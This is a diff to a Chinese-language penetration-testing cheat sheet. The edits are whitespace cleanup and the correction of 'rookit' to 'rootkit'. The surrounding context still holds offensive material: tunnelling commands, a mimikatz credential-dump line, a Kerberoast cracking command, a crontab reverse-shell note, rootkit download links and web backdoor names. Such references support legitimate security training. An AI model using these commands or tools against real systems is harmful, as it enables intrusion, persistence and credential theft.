@@ -1,6 +1,6 @@
  Author: [Evi1cg](https://twitter.com/Evi1cg) 
  Blog: https://evi1cg.github.io
-  
+
 
 Table of Contents
 =================
@@ -105,7 +105,7 @@ Table of Contents
       * [SSH Server wrapper](#ssh-server-wrapper)
       * [SSH keylogger](#ssh-keylogger)
       * [Cymothoa\_进程注入backdoor](#cymothoa_%E8%BF%9B%E7%A8%8B%E6%B3%A8%E5%85%A5backdoor)
-      * [rookit](#rookit)
+      * [rootkit](#rootkit)
       * [Tools](#tools)
   * [WEB后门](#web%E5%90%8E%E9%97%A8)
 * [横向渗透](#%E6%A8%AA%E5%90%91%E6%B8%97%E9%80%8F)
@@ -173,7 +173,7 @@ Table of Contents
     * 自搭建:https://github.com/hanc00l/wooyun_publi/
 
 #### google hacking 
- 
+
 ### 创建企业密码字典 
 #### 字典列表 
 * passwordlist:https://github.com/lavalamp-/password-lists
@@ -291,7 +291,7 @@ ls xxx.yyy.cn #列出域信息
 ### Froting 
 * [Domain Fronting ](https://evi1cg.me/archives/Domain_Fronting.html)
 * [Tor_Fronting.](https://evi1cg.me/archives/Tor_Fronting.html)
-    
+  
 ### 代理 
 * VPN 
 * shadowsockts :https://github.com/shadowsocks
@@ -308,7 +308,7 @@ ls xxx.yyy.cn #列出域信息
     1. [Tunna ](https://github.com/SECFORCE/Tunna)
     2. [Reduh ](https://github.com/sensepost/reDuh)
 * ... 
-    
+  
 ### 内网跨边界代理穿透 
 #### [EW](https://rootkiter.com/EarthWorm/) 
 正向 SOCKS v5 服务器:
@@ -330,7 +330,7 @@ $ ./ew -s rssocks -d 1.1.1.1 -e 8888
 $ ./ew -s lcx_listen -l 1080 -e 8888
 $ ./ew -s lcx_tran -l 1080 -f 2.2.2.3 -g 9999
 $ ./ew -s lcx_slave -d 1.1.1.1 -e 8888 -f 2.2.2.3 -g 9999
-``` 
+```
 lcx_tran 的用法
 ```
 $ ./ew -s ssocksd -l 9999
@@ -516,7 +516,7 @@ rsync
 远程rsync服务器中拷贝文件到本地机 
 ```
 rsync -av root@192.168.78.192::www /databack
-```   
+```
 本地机器拷贝文件到远程rsync服务器 
 ```
 rsync -av /databack root@192.168.78.192::www
@@ -687,7 +687,7 @@ ftp等
 * [nirsoft_package](http://launcher.nirsoft.net/downloads/)
 * [QuarksPwDump](https://github.com/quarkslab/quarkspwdump) [fgdump](https://github.com/mcandre/fgdump)
 * 星号查看器等
-    
+  
 ##### Linux
 * [LaZagne](https://github.com/AlessandroZ/LaZagne)  
 * [mimipenguin](https://github.com/huntergregal/mimipenguin)
@@ -1080,7 +1080,7 @@ New-ItemProperty "HKCU:\Environment\" UserInitMprLogonScript -value "c:\test\11.
 ```
 ##### 30、[Password Filter DLL](https://3gstudent.github.io/3gstudent.github.io/Password-Filter-DLL%E5%9C%A8%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E7%9A%84%E5%BA%94%E7%94%A8/) 
 ##### 31、[利用BHO实现IE浏览器劫持](https://3gstudent.github.io/3gstudent.github.io/%E5%88%A9%E7%94%A8BHO%E5%AE%9E%E7%8E%B0IE%E6%B5%8F%E8%A7%88%E5%99%A8%E5%8A%AB%E6%8C%81/) 
-        
+
 #### Linux 
 ##### crontab 
 每60分钟反弹一次shell给dns.wuyun.org的53端口
@@ -1123,14 +1123,19 @@ source .bashrc
 ```
 nc -vv ip 7777
 ```
-##### rookit 
-[openssh_rookit](http://core.ipsecs.com/rootkit/patch-to-hack/0x06-openssh-5.9p1.patch.tar.gz)
+##### rootkit
+
+[openssh_rootkit](http://core.ipsecs.com/rootkit/patch-to-hack/0x06-openssh-5.9p1.patch.tar.gz)
 [Kbeast_rootkit ](http://core.ipsecs.com/rootkit/kernel-rootkit/ipsecs-kbeast-v1.tar.gz)
-Mafix + Suterusu rookit
-##### Tools 
+Mafix + Suterusu rootkit
+
+##### Tools
+
 [Vegile ](https://github.com/Screetsec/Vegile)
 [backdoor ](https://github.com/icco/backdoor)
-### WEB后门 
+
+### WEB后门
+
 PHP Meterpreter后门 
 Aspx Meterpreter后门 
 weevely 
@@ -1293,7 +1298,7 @@ Get-NetFiles - gets open files on a server
 Get-NetProcesses - gets the remote processes and owners on a remote server
 ```
 BloodHound
-            
+​            
 #### 获取域控的方法 
 ##### SYSVOL 
 SYSVOL是指存储域公共文件服务器副本的共享文件夹，它们在域中所有的域控制器之间复制。 Sysvol文件夹是安装AD时创建的，它用来存放GPO、Script等信息。同时，存放在Sysvol文件夹中的信息，会复制到域中所有DC上。 
@@ -1377,7 +1382,7 @@ tgsrepcrack.py wordlist.txt 1-MSSQLSvc~sql01.medin.local~1433-MYDOMAIN.LOCAL.kir
 从搜集的密码里面找管理员的密码 
 ##### 地址解析协议 
 实在搞不定再搞ARP 
-    
+​    
 #### 获取AD哈希 
 * 使用VSS卷影副本 
 * Ntdsutil中获取NTDS.DIT​​文件 
@@ -1386,7 +1391,7 @@ tgsrepcrack.py wordlist.txt 1-MSSQLSvc~sql01.medin.local~1433-MYDOMAIN.LOCAL.kir
 
 ```
 mimikatz lsadump::lsa /inject exit 
-``` 
+```
 * 使用PowerShell Mimikatz
 * 使用Mimikatz的DCSync 远程转储Active Directory凭证
 提取 KRBTGT用户帐户的密码数据：
@@ -1470,7 +1475,7 @@ http://wooyun.jozxing.cc/static/drops/tips-13079.html
 * [Responder](https://github.com/SpiderLabs/Responder) 
 * [MITMf](https://github.com/byt3bl33d3r/MITMf) 
 * [3r/MITMf)](https://github.com/evilsocket/bettercap) 
-    
+  
 ### 规避杀软及检测 
 #### Bypass Applocker 
 [UltimateAppLockerByPassList ](https://github.com/api0cradle/UltimateAppLockerByPassList)
